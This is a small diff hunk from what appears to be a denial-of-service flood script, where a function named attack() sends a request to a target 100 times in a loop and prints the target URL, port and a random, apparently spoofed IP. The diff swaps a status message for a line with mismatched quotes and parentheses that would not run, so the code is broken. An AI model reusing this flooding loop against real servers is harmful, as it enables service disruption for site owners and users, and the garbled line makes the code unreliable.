@@ -68,7 +68,7 @@ def attack():
       #star here
       for y in range(100):
           atk.send(str.encode(request))
-          print("\033[48;5;4mStarting attack \033[0m \033[32m" +str(url)+ " \033[91m0nfire..!!\033[0m")
+          print("\033[48;5;4m"str.encode(request))")
           print("\033[32mport \033[95m" +str(ip)+ "")
           print("\033[33mrequrst " +str(randip)+ "")
     except socket.error:
